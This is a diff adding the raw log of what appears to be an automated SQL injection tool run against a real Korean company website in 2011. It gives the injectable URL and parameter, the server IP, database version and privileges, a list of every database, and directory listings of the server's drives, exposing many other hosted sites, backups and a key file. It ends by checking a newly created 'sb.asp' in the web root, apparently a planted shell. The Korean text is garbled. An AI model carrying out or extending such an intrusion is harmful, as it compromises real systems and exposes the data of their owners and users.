@@ -1,0 +1,411 @@
+■漏洞信息:============================================================
+ ·URL:http://www.bleiz.co.kr/customer/edit.asp?page=&id=bleiz_notice&ref=2&step=1
+ ·页面标题：ENERTEC(BLEIZ.CO.KR) 权其捞瘤俊 坷脚巴阑 券康钦聪促.
+ ·参数:page=&id=bleiz_notice&ref=2&step=1
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:125.141.234.202
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: WWW Server/1.1
+Date: Mon, 04 Apr 2011 08:50:37 GMT
+Connection: Keep-Alive
+Content-Length: 13476
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQABCSTQB=FLGOIIKDHMACJEKFHIGEONLL; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：board21
+- 用户名：board21
+- 版本：Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：ILEADER-JANG1
+- 服务名：MSSQLSERVER
+- 系统用户名：board21
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+artgwangju	C:\Program Files\Microsoft SQL Server\MSSQL\data\artgwangju_Data.MDF	
+bittran	C:\Program Files\Microsoft SQL Server\MSSQL\data\bittran_Data.MDF	
+board11	C:\Program Files\Microsoft SQL Server\MSSQL\data\board11_Data.MDF	
+board21	C:\Program Files\Microsoft SQL Server\MSSQL\data\board21_Data.MDF	
+board31	C:\Program Files\Microsoft SQL Server\MSSQL\data\board31_Data.MDF	
+board41	C:\Program Files\Microsoft SQL Server\MSSQL\data\board41_Data.MDF	
+commonbbs	C:\Program Files\Microsoft SQL Server\MSSQL\data\commonbbs_Data.MDF	
+coramdeo	C:\Program Files\Microsoft SQL Server\MSSQL\data\coramdeo_Data.MDF	
+garimeng	C:\Program Files\Microsoft SQL Server\MSSQL\data\garimeng_Data.MDF	
+gdok2009	C:\Program Files\Microsoft SQL Server\MSSQL\data\gdok2009_Data.MDF	
+gdok2009_china	C:\Program Files\Microsoft SQL Server\MSSQL\data\gdok2009_china_Data.MDF	
+itpe2006or	C:\Program Files\Microsoft SQL Server\MSSQL\data\itpe2006or_Data.MDF	
+jangin2	C:\Program Files\Microsoft SQL Server\MSSQL\data\jangin2_Data.MDF	
+jobansan	C:\Program Files\Microsoft SQL Server\MSSQL\data\jobansan_Data.MDF	
+kodmia	C:\Program Files\Microsoft SQL Server\MSSQL\data\kodmia_Data.MDF	
+ksfa	C:\Program Files\Microsoft SQL Server\MSSQL\data\ksfa_Data.MDF	
+ktpack	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ktpack_Data.MDF	
+kunja_db	C:\Program Files\Microsoft SQL Server\MSSQL\data\kunja_db_Data.MDF	
+maki	e:\mssql\MSSQL\data\maki_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+miyachikorea_co_kr	C:\Program Files\Microsoft SQL Server\MSSQL\data\miyachikorea_co_kr_Data.MDF	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+parann	C:\Program Files\Microsoft SQL Server\MSSQL\data\parann_Data.MDF	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+seomoon	C:\Program Files\Microsoft SQL Server\MSSQL\data\seomoon_Data.MDF	
+stockpia	C:\Program Files\Microsoft SQL Server\MSSQL\data\stockpia_Data.MDF	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	ILEADER-JANG1	1444	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	ILEADER-JANG1	1444	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	ILEADER-JANG1	1444	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	ILEADER-JANG1	1444	AWAITING COMMAND		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	ILEADER-JANG1	1444	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+ILEADER-JANG1	SQL Server	SQLOLEDB	ILEADER-JANG1		ILEADER-JANG1	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of C:: 
+
+Documents and Settings\
+Drivers\
+Inetpub\
+INIpay41\
+Program Files\
+RECYCLER\
+SQL2KSP4\
+System Volume Information\
+temp\
+WINNT\
+gvmlog.txt
+newfile.asp
+odbcconf.log
+
+Dir of D:: 
+
+夯荤昆\
+Config.Msi\
+database\
+Power\
+RECYCLER\
+System Volume Information\
+temp_dns\
+Util\
+10201_database_win32.zip
+PowerEasy2006_SP6_DLL.rar
+resin.zip
+resin-pro-3.1.2.zip
+
+Dir of D:\database: 
+
+accessbridge\
+asmtool\
+autorun\
+doc\
+install\
+response\
+stage\
+autorun.inf
+setup.exe
+welcome.html
+
+Dir of D:\Power: 
+
+
+Dir of D:\RECYCLER: 
+
+S-1-5-21-1214440339-1229272821-682003330-500\
+S-1-5-21-507921405-179605362-839522115-500\
+
+Dir of D:\System Volume Information: 
+
+
+Dir of D:\temp_dns: 
+
+backup\
+samples\
+234.141.125.in-addr.arpa.dns
+4jobsinusa.com.dns
+CACHE.DNS
+dns.log
+
+Dir of D:\Util: 
+
+tmservice\
+w2k_Server\
+w2k_SP4\
+ALFTP422.exe
+auth.zip
+NanumiImagePlus_v1_22.exe
+servU6.4_key.txt
+
+Dir of E:: 
+
+b0ba4276c230829a8a4773e\
+Config.Msi\
+DB_backup\
+files.itpeor\
+MSSQL\
+RECYCLER\
+System Volume Information\
+temp\
+Util\
+website_old\
+wwwroot\
+202.mdb
+autorun.inf
+board9DB.BAK
+data.sql
+DB肺弊颇老临捞绰过.txt
+setup.exe
+skyDB.xls
+
+Dir of E:\wwwroot: 
+一次性获取失败，正在批次获取……
+
+acuakorea\
+andtag\
+artgwangju_old\
+artgwangju2010_old\
+artgwangju2010_old2\
+artgwangju2010\
+bittran\
+bleiz_new\
+bleiz\
+buypack_old\
+buypack2009\
+chojungtour\
+chunyoung\
+cns88\
+coramdeo\
+daegunhcp\
+durejs\
+enerteckorea\
+garimeng\
+gdok_china_old\
+gdok2009\
+greenchem\
+gyms\
+haedong\
+hansinc\
+iforumi\
+iljintech\
+infoleader\
+ione21\
+itpe_or_old\
+itpe2010\
+jeilmat\
+jobansan\
+jobinchon\
+jobjechon\
+jobpaju\
+jobsuwon\
+kangnam\
+kjchem\
+kodmia\
+ksfa\
+kssnp\
+ktpack\
+kunja\
+maki_shop\
+maki\
+mncdental\
+nadi\
+niwin\
+nutemrnd\
+onepower\
+parann\
+popcorn\
+qdc\
+reco\
+seah\
+secentech\
+sejongls\
+seoeunfa\
+seomoon_2009\
+seomoon_old\
+shinyoung\
+signin_old\
+signin\
+sme15\
+stockpia_old\
+stockpia\
+tad\
+vitzina\
+winternet_web\
+winternet\
+wooridul\
+ymit\
+DB俊 火涝等 胶农赋飘 昏力窍绰 孽府.txt
+DB俊 火涝等 胶农赋飘 昏力窍绰 孽府巩.txt
+dns.zip
+menu.swf
+menu1.swf
+neboard.sql
+test.txt
+test2.txt
+winternet.zip
+
+Dir of E:\wwwroot\bleiz: 
+
+about\
+admin\
+as\
+customer\
+images\
+img\
+imgpds\
+pds\
+photo\
+product\
+sitemap\
+spec\
+temp\
+bg.asp
+bg1.asp
+copy.asp
+copy1.asp
+dbcon.asp
+element.txt
+main.asp
+main.html
+main1.html
+menu.fla
+menu.swf
+menu1.swf
+product.html
+quick.asp
+top.asp
+top1.asp
+
+Dir of C:\Inetpub: 
+
+AdminScripts\
+ftproot\
+iissamples\
+mailroot\
+scripts\
+wwwroot\
+
+Dir of C:\Inetpub\wwwroot: 
+
+_private\
+_vti_cnf\
+_vti_log\
+_vti_pvt\
+_vti_script\
+_vti_txt\
+images\
+_vti_inf.html
+help.gif
+iisstart.asp
+localstart.asp
+mmc.gif
+pagerror.gif
+postinfo.html
+print.gif
+warning.gif
+web.gif
+win2000.gif
+
+Dir of E:\wwwroot\bleiz_new: 
+
+images\
+main.asp
+
+Dir of E:\wwwroot\bleiz: 
+
+about\
+admin\
+as\
+customer\
+images\
+img\
+imgpds\
+pds\
+photo\
+product\
+sitemap\
+spec\
+temp\
+bg.asp
+bg1.asp
+copy.asp
+copy1.asp
+dbcon.asp
+element.txt
+main.asp
+main.html
+main1.html
+menu.fla
+menu.swf
+menu1.swf
+product.html
+quick.asp
+top.asp
+top1.asp
+web.asp
+web.asp.tmp
+web1.asp
+web1.asp.tmp
+
+■正在获取文件属性：
+文件名:E:\wwwroot\bleiz\sb.asp
+文件大小：212480
+创建时间：20110405:115503
+
+■数据库信息:============================================================
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:board21
+ ·版本:Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
+	Aug  6 2000 00:57:48 
+	Copyright (c) 1988-2000 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+
+■数据库信息:============================================================
